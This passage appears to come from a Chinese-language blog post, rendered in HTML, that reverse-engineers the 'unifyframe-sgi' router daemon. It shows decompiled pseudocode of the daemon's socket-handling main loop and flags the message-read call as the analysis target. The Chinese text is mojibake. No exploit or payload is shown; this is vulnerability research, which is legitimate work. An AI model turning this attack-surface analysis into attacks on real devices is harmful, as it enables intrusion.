*v9; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> *v10; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// $s2</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// $v0</span></span><br><span class="line">  BOOL v17; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// $v1</span></span><br><span class="line">  <span class="type">int</span> *v19; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> *v20; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// $s4</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v23; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v24; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> client; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">int</span> v26; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> *v27; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">int</span> v28; <span class="comment">// $v0</span></span><br><span class="line">  _DWORD *sock; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v30; <span class="comment">// $a0</span></span><br><span class="line">  _DWORD *addr; <span class="comment">// $s0</span></span><br><span class="line">  _DWORD *v32; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v33; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *method; <span class="comment">// $s6</span></span><br><span class="line">  <span class="type">int</span> v35; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v36; <span class="comment">// $v1</span></span><br><span class="line">  <span class="type">int</span> v37; <span class="comment">// $a0</span></span><br><span class="line">  _DWORD *v38; <span class="comment">// $v0</span></span><br><span class="line">  _DWORD *v39; <span class="comment">// $v0</span></span><br><span class="line">  _DWORD *v40; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v41; <span class="comment">// $s6</span></span><br><span class="line">  _DWORD *v42; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v43[<span class="number">28</span>]; <span class="comment">// [sp+30h] [-C0h] BYREF</span></span><br><span class="line">  __int16 v44[<span class="number">2</span>]; <span class="comment">// [sp+A0h] [-50h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v45; <span class="comment">// [sp+A4h] [-4Ch]</span></span><br><span class="line">  <span class="type">int</span> v46; <span class="comment">// [sp+A8h] [-48h]</span></span><br><span class="line">  <span class="type">char</span> v47[<span class="number">4</span>]; <span class="comment">// [sp+C4h] [-2Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v48[<span class="number">8</span>]; <span class="comment">// [sp+C8h] [-28h] BYREF</span></span><br><span class="line">  <span class="type">int</span> *v49; <span class="comment">// [sp+D0h] [-20h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [sp+D4h] [-1Ch]</span></span><br><span class="line">  _DWORD *aa; <span class="comment">// [sp+D8h] [-18h]</span></span><br><span class="line">  <span class="type">int</span> v52; <span class="comment">// [sp+DCh] [-14h]</span></span><br><span class="line">  __int16 *v53; <span class="comment">// [sp+E0h] [-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v54; <span class="comment">// [sp+E4h] [-Ch]</span></span><br><span class="line">  <span class="type">int</span> *v55; <span class="comment">// [sp+E8h] [-8h]</span></span><br><span class="line"></span><br><span class="line">  mkdir(<span class="string">&quot;/tmp/uniframe_sgi&quot;</span>, <span class="number">511</span>, envp);        <span class="comment">// åˆ›å»ºæ–‡ä»¶å¤¹</span></span><br><span class="line">  v49 = v43;</span><br><span class="line">  <span class="built_in">memset</span>(v43, <span class="number">0</span>, <span class="number">64</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(v43, <span class="string">&quot;/tmp/sgi&quot;</span>);</span><br><span class="line">  <span class="built_in">strcat</span>(v43, <span class="string">&quot;.sgi_ufm&quot;</span>);</span><br><span class="line">  v5 = open(v43, <span class="number">770</span>, <span class="number">438</span>);</span><br><span class="line">  dword_435660 = v5;</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = *(_DWORD *)_errno_location();</span><br><span class="line">    v7 = strerror(v6);</span><br><span class="line">    v8 = v6;</span><br><span class="line">    v9 = <span class="string">&quot;Failed to open file %s, errno=%d, %s.&quot;</span>;</span><br><span class="line">LABEL_8:</span><br><span class="line">    <span class="built_in">printf</span>(v9, <span class="string">&quot;.sgi_ufm&quot;</span>, v8, v7);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v44[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">  v45 = <span class="number">0</span>;</span><br><span class="line">  v44[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v46 = <span class="number">0</span>;</span><br><span class="line">  v53 = v44;</span><br><span class="line">  <span class="keyword">if</span> ( fcntl(v5, <span class="number">6</span>, v44) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = (<span class="type">int</span> *)_errno_location();</span><br><span class="line">    <span class="keyword">if</span> ( *v10 == <span class="number">13</span> || *v10 == <span class="number">11</span> )</span><br><span class="line">      close(dword_435660);</span><br><span class="line">    v11 = *v10;</span><br><span class="line">    v7 = strerror(v11);</span><br><span class="line">    v8 = v11;</span><br><span class="line">    v9 = <span class="string">&quot;Failed to lock file %s, errno=%d, %s.&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">  &#125;</span><br><span class="line">  reserve_record();</span><br><span class="line">  reserve_core();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v13 = getopt(argc, argv, &amp;dword_41FF6C);</span><br><span class="line">    <span class="keyword">if</span> ( v13 == <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v13 == <span class="number">100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)open debug mode!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;main&quot;</span>, <span class="number">1566</span>);</span><br><span class="line">      g_debug = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v13 == <span class="number">104</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;unifyframe-sgi.elf:&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;-h : show help message &quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;-d: open debug mode&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_98;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sem_init(&amp;unk_435E3C, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  openlog(<span class="string">&quot;unifyframe-sgi&quot;</span>, <span class="number">3</span>, <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !ufm_init() )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( uf_ubus_init() )</span><br><span class="line">    &#123;</span><br><span class="line">      uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)uf_ubus_init failed!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;main&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v43[<span class="number">1</span>] = (<span class="type">int</span>)handle_pipe;</span><br><span class="line">    sigemptyset(&amp;v43[<span class="number">2</span>]);</span><br><span class="line">    v43[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    sigaction(<span class="number">13</span>, v43, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( sgi_mgr_init(&amp;g_sgi_client_mgr) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v14 = uf_socket_server_init(<span class="number">20</span>);</span><br><span class="line">      v15 = v14;</span><br><span class="line">      <span class="keyword">if</span> ( v14 &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( uf_cmd_task_init() )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_98;</span><br><span class="line">        <span class="keyword">if</span> ( uf_create_detached_thread(v48, sub_405418, <span class="number">0</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          v16 = <span class="number">1608</span>;</span><br><span class="line">LABEL_27:</span><br><span class="line">          uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)create thread failed!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;main&quot;</span>, v16);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_98;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( uf_create_detached_thread(v47, sub_40715C, <span class="number">0</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          v16 = <span class="number">1613</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( g_debug &gt;= <span class="number">2</span> )</span><br><span class="line">          uf_log_printf(uf_log, <span class="string">&quot;(%s %s %d)init ok&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;main&quot;</span>, <span class="number">1617</span>);</span><br><span class="line">        signal(<span class="number">18</span>, handler);</span><br><span class="line">        uf_redirect();</span><br><span class="line">        v52 = <span class="number">1</span> &lt;&lt; v15;</span><br><span class="line">        v54 = <span class="number">4</span> * ((<span class="type">unsigned</span> <span class="type">int</span>)v15 &gt;&gt; <span class="number">5</span>);</span><br><span class="line">        v55 = &amp;g_fd_set[v54 / <span class="number">4</span>];</span><br><span class="line">        v17 = v15 &lt; <span class="number">0</span>;</span><br><span class="line">LABEL_31:</span><br><span class="line">        v18 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !v17 )</span><br><span class="line">          v18 = v15;</span><br><span class="line">        i = v18;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v19 = g_fd_set;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">            *v19++ = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">while</span> ( v19 != (<span class="type">int</span> *)&amp;g_test_mutex );</span><br><span class="line">          *v55 |= v52;</span><br><span class="line">          fbss = i;</span><br><span class="line">          pthread_mutex_lock(&amp;unk_436370);</span><br><span class="line">          v20 = (<span class="type">int</span> *)(dword_436364 - <span class="number">12</span>);</span><br><span class="line">          v21 = *(_DWORD *)dword_436364 - <span class="number">12</span>;</span><br><span class="line">          <span class="keyword">while</span> ( v20 + <span class="number">3</span> != &amp;dword_436364 )</span><br><span class="line">          &#123;</span><br><span class="line">            pthread_mutex_lock(v20 + <span class="number">5</span>);</span><br><span class="line">            <span class="keyword">if</span> ( *v20 != <span class="number">-1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              g_fd_set[(<span class="type">unsigned</span> <span class="type">int</span>)*v20 &gt;&gt; <span class="number">5</span>] |= <span class="number">1</span> &lt;&lt; *v20;</span><br><span class="line">              v22 = *v20;</span><br><span class="line">              <span class="keyword">if</span> ( fbss &gt;= *v20 )</span><br><span class="line">                v22 = fbss;</span><br><span class="line">              fbss = v22;</span><br><span class="line">            &#125;</span><br><span class="line">            pthread_mutex_unlock(v20 + <span class="number">5</span>);</span><br><span class="line">            v20 = (<span class="type">int</span> *)v21;</span><br><span class="line">            v21 = *(_DWORD *)(v21 + <span class="number">12</span>) - <span class="number">12</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          pthread_mutex_unlock(&amp;unk_436370);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( select(fbss + <span class="number">1</span>, g_fd_set, <span class="number">0</span>, <span class="number">0</span>) &lt;= <span class="number">0</span> );</span><br><span class="line">        <span class="keyword">if</span> ( (v52 &amp; g_fd_set[v54 / <span class="number">4</span>]) == <span class="number">0</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_58;</span><br><span class="line">        <span class="keyword">if</span> ( g_sgi_client_mgr &gt;= <span class="number">100</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)connect is full %d\n&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;main&quot;</span>, <span class="number">1646</span>, v15);</span><br><span class="line">          sleep(<span class="number">1</span>);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_94;</span><br><span class="line">        &#125;</span><br><span class="line">        v23 = accept(v15, v43, v44);</span><br><span class="line">        v24 = v23;</span><br><span class="line">        <span class="keyword">if</span> ( v23 &lt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">            uf_log_printf(uf_log, <span class="string">&quot;(%s %s %d)accept a client filed![%d]&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;sgi_accept_client&quot;</span>, <span class="number">1391</span>, v23);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_58;</span><br><span class="line">        &#125;</span><br><span class="line">        client = sgi_mgr_get_client(v23);</span><br><span class="line">        <span class="keyword">if</span> ( client )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">            uf_log_printf(uf_log, <span class="string">&quot;(%s %s %d)get a client from list %d&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;sgi_accept_client&quot;</span>, <span class="number">1397</span>, v24);</span><br><span class="line">          *(_DWORD *)(client + <span class="number">48</span>) = <span class="number">20</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_58;</span><br><span class="line">        &#125;</span><br><span class="line">        v26 = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">52</span>);</span><br><span class="line">        v27 = (<span class="type">int</span> *)v26;</span><br><span class="line">        <span class="keyword">if</span> ( v26 )</span><br><span class="line">        &#123;</span><br><span class="line">          v28 = v26 + <span class="number">4</span>;</span><br><span class="line">          v27[<span class="number">2</span>] = v28;</span><br><span class="line">          v27[<span class="number">1</span>] = v28;</span><br><span class="line">          <span class="keyword">if</span> ( !pthread_mutex_init(v27 + <span class="number">5</span>, <span class="number">0</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            v27[<span class="number">11</span>] = <span class="number">0</span>;</span><br><span class="line">            *v27 = v24;</span><br><span class="line">            v27[<span class="number">12</span>] = <span class="number">20</span>;</span><br><span class="line">            ((<span class="type">void</span> (__fastcall *)(<span class="type">int</span> *))sgi_mgr_add_client)(v27);</span><br><span class="line">LABEL_58:</span><br><span class="line">            pthread_mutex_lock(&amp;unk_436370);</span><br><span class="line">            sock = (_DWORD *)(dword_436364 - <span class="number">12</span>);</span><br><span class="line">            <span class="keyword">for</span> ( i = *(_DWORD *)dword_436364 - <span class="number">12</span>; ; i = *(_DWORD *)(v30 + <span class="number">12</span>) - <span class="number">12</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( sock + <span class="number">3</span> == &amp;dword_436364 )</span><br><span class="line">              &#123;</span><br><span class="line">                pthread_mutex_unlock(&amp;unk_436370);</span><br><span class="line">LABEL_94:</span><br><span class="line">                v17 = v15 &lt; <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> ( *sock == <span class="number">-1</span> )</span><br><span class="line">                <span class="keyword">goto</span> LABEL_91;</span><br><span class="line">              v30 = i;</span><br><span class="line">              <span class="keyword">if</span> ( ((g_fd_set[*sock &gt;&gt; <span class="number">5</span>] &gt;&gt; *sock) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">                <span class="keyword">goto</span> LABEL_92;</span><br><span class="line">              <span class="keyword">if</span> ( g_pkg_cnt &lt; <span class="number">101</span> )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)packet full!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;client_recv_pkg&quot;</span>);</span><br><span class="line">LABEL_91:</span><br><span class="line">              v30 = i;</span><br><span class="line">LABEL_92:</span><br><span class="line">              sock = (_DWORD *)v30;</span><br><span class="line">            &#125;</span><br><span class="line">            addr = malloc_pkg();</span><br><span class="line">            <span class="keyword">if</span> ( !addr )</span><br><span class="line">            &#123;</span><br><span class="line">              uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)memory full!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;client_recv_pkg&quot;</span>);</span><br><span class="line">              <span class="keyword">goto</span> LABEL_91;</span><br><span class="line">            &#125;</span><br><span class="line">            pthread_mutex_lock(sock + <span class="number">5</span>);       <span class="comment">// ä¸Šé”</span></span><br><span class="line">            *addr = sock;</span><br><span class="line">            aa = (_DWORD *)uf_socket_msg_read(*sock, addr + <span class="number">1</span>);<span class="comment">// ######################target####################</span></span><br><span class="line">            pthread_mutex_unlock(sock + <span class="number">5</span>);     <span class="comment">// è§£é”</span></span><br><span class="line">            <span class="keyword">if</span> ( (<span class="type">int</span>)aa &lt;= <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              sub_404A34(sock + <span class="number">3</span>);</span><br><span class="line">              <span class="keyword">if</span> ( g_sgi_client_mgr &gt; <span class="number">0</span> )</span><br><span class="line">                --g_sgi_client_mgr;</span><br><span class="line">              <span class="keyword">if</span> ( sub_405238(sock) )</span><br><span class="line">              &#123;</span><br><span class="line">                v32 = (_DWORD *)dword_436368;</span><br><span class="line">                dword_436368 = (<span class="type">int</span>)(sock + <span class="number">3</span>);</span><br><span class="line">                sock[<span class="number">4</span>] = v32;</span><br><span class="line">                sock[<span class="number">3</span>] = &amp;dword_436364;</span><br><span class="line">                *v32 = sock + <span class="number">3</span>;</span><br><span class="line">                ++g_sgi_client_mgr;</span><br><span class="line">              &#125;</span><br><span class="line">              v33 = addr[<span class="number">1</span>];</span><br><span class="line">              <span class="keyword">if</span> ( v33 )</span><br><span class="line">                <span class="built_in">free</span>(v33);</span><br><span class="line">LABEL_90:</span><br><span class="line">              <span class="built_in">free</span>(addr);</span><br><span class="line">              <span class="keyword">goto</span> LABEL_91;</span><br><span class="line">            &#125;</span><br><span class="line">            method = (<span class="type">const</span> <span class="type">char</span> *)addr[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> ( method )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( <span class="built_in">strstr</span>(addr[<span class="number">1</span>], <span class="string">&quot;.get&quot;</span>) )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">if</span> ( g_debug &lt; <span class="number">3</span> )</span><br><span class="line">                  <span class="keyword">goto</span> LABEL_82;</span><br><span class="line">                v35 = <span class="built_in">strlen</span>(method);</span><br><span class="line">                v36 = <span class="number">735</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">if</span> ( g_debug &lt; <span class="number">2</span> )</span><br><span class="line">                  <span class="keyword">goto</span> LABEL_82;</span><br><span class="line">                v35 = <span class="built_in">strlen</span>(method);</span><br><span class="line">                v36 = <span class="number">733</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              uf_log_printf(</span><br><span class="line">                uf_log,</span><br><span class="line">                <span class="string">&quot;(%s %s %d)------[%x][%d][%d]package buf:%s&quot;</span>,</span><br><span class="line">                <span class="string">&quot;sgi.c&quot;</span>,</span><br><span class="line">                <span class="string">&quot;client_recv_pkg&quot;</span>,</span><br><span class="line">                v36,</span><br><span class="line">                addr,</span><br><span class="line">                *(_DWORD *)*addr,</span><br><span class="line">                v35,</span><br><span class="line">                method);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              uf_log_printf(</span><br><span class="line">                uf_log,</span><br><span class="line">                <span class="string">&quot;ERROR (%s %s %d)------[%x][%d]package buf is NULL!&quot;</span>,</span><br><span class="line">                <span class="string">&quot;sgi.c&quot;</span>,</span><br><span class="line">                <span class="string">&quot;client_recv_pkg&quot;</span>,</span><br><span class="line">                <span class="number">738</span>,</span><br><span class="line">                addr,</span><br><span class="line">                *(_DWORD *)*addr);</span><br><span class="line">            &#125;</span><br><span class="line">LABEL_82:</span><br><span class="line">            <span class="keyword">if</span> ( !parse_content((<span class="type">int</span>)addr) )</span><br><span class="line">            &#123;</span><br><span class="line">              pthread_mutex_lock(sock + <span class="number">5</span>);</span><br><span class="line">              v38 = (_DWORD *)sock[<span class="number">2</span>];</span><br><span class="line">              sock[<span class="number">2</span>] = addr + <span class="number">24</span>;</span><br><span class="line">              addr[<span class="number">24</span>] = sock + <span class="number">1</span>;</span><br><span class="line">              addr[<span class="number">25</span>] = v38;</span><br><span class="line">              *v38 = addr + <span class="number">24</span>;</span><br><span class="line">              sock[<span class="number">12</span>] = <span class="number">20</span>;</span><br><span class="line">              sock[<span class="number">11</span>] = <span class="number">0</span>;</span><br><span class="line">              pthread_mutex_unlock(sock + <span class="number">5</span>);</span><br><span class="line">              <span class="keyword">if</span> ( !add_pkg_cmd2_task(addr) )</span><br><span class="line">              &#123;</span><br><span class="line">                v30 = i;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_92;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)recv package failed!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;client_recv_pkg&quot;</span>, <span class="number">765</span>);</span><br><span class="line">            v37 = addr[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> ( v37 )</span><br><span class="line">              <span class="built_in">free</span>(v37);</span><br><span class="line">            v39 = (_DWORD *)addr[<span class="number">22</span>];</span><br><span class="line">            v40 = v39 - <span class="number">13</span>;</span><br><span class="line">            v41 = *v39 - <span class="number">52</span>;</span><br><span class="line">            aa = addr + <span class="number">22</span>;</span><br><span class="line">            <span class="keyword">while</span> ( v40 + <span class="number">13</span> != aa )</span><br><span class="line">            &#123;</span><br><span class="line">              sub_404A34(v40 + <span class="number">13</span>);</span><br><span class="line">              v42 = v40;</span><br><span class="line">              v40 = (_DWORD *)v41;</span><br><span class="line">              free_cmd(v42);</span><br><span class="line">              v41 = *(_DWORD *)(v41 + <span class="number">52</span>) - <span class="number">52</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_90;</span><br><span class="line">          &#125;</span><br><span class="line">          uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)failed to init mutex!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;sgi_client_malloc&quot;</span>, <span class="number">1171</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)client malloc failed %d&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;sgi_accept_client&quot;</span>, <span class="number">1404</span>, v24);</span><br><span class="line">        close(v24);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_58;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v14 )</span><br><span class="line">      &#123;</span><br><span class="line">        unlink(<span class="string">&quot;/tmp/uniframe_sgi/unifyframe_sgi.sock&quot;</span>);</span><br><span class="line">        close(v15);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    pthread_mutex_destroy(&amp;unk_436370);</span><br><span class="line">LABEL_98:</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)ufm_ini failed!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;main&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°ä¸€æ ·çš„é•¿ï¼Œä¸€æ ·çš„éœ‡æ’¼</p><p>ä½†æ˜¯å‰é¢åŸºæœ¬æ²¡å•¥ç”¨åªçœ‹readä¹‹åçš„éƒ¨åˆ†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">pthread_mutex_lock(sock + <span class="number">5</span>);       <span class="comment">// ä¸Šé”</span></span><br><span class="line">*addr = sock;</span><br><span class="line">aa = (_DWORD *)uf_socket_msg_read(*sock, addr + <span class="number">1</span>);<span class="comment">// ######################target####################</span></span><br><span class="line">pthread_mutex_unlock(sock + <span class="number">5</span>);     <span class="comment">// è§£é”</span></span><br><span class="line"><span class="keyword">if</span> ( (<span class="type">int</span>)aa &lt;= <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">   .......</span><br><span class="line">&#125;</span><br><span class="line">method = (<span class="type">const</span> <span class="type">char</span> *)addr[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span> ( method )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(addr[<span class="number">1</span>], <span class="string">&quot;.get&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( g_debug &lt; <span class="number">3</span> )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_82;</span><br><span class="line">        v35 = <span class="built_in">strlen</span>(method);</span><br><span class="line">        v36 = <span class="number">735</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( g_debug &lt; <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_82;</span><br><span class="line">        v35 = <span class="built_in">strlen</span>(method);</span><br><span class="line">        v36 = <span class="number">733</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    uf_log_printf(</span><br><span class="line">        uf_log,</span><br><span class="line">        <span class="string">&quot;(%s %s %d)------[%x][%d][%d]package buf:%s&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sgi.c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;client_recv_pkg&quot;</span>,</span><br><span class="line">        v36,</span><br><span class="line">        addr,</span><br><span class="line">        *(_DWORD *)*addr,</span><br><span class="line">        v35,</span><br><span class="line">        method);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    uf_log_printf(</span><br><span class="line">        uf_log,</span><br><span class="line">        <span class="string">&quot;ERROR (%s %s %d)------[%x][%d]package buf is NULL!&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sgi.c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;client_recv_pkg&quot;</span>,</span><br><span class="line">        <span class="number">738</span>,</span><br><span class="line">        addr,</span><br><span class="line">        *(_DWORD *)*addr);</span><br><span class="line">&#125;</span><br><span class="line">LABEL_82:</span><br><span class="line"><span class="keyword">if</span> ( !parse_content((<span class="type">int</span>)addr) )</span><br><span class="line">&#123;</span><br><span class="line">    pthread_mutex_lock(sock + <span class="number">5</span>);</span><br><span class="line">    v38 = (_DWORD *)sock[<span class="number">2</span>];</span><br><span class="line">    sock[<span class="number">2</span>] = addr + <span 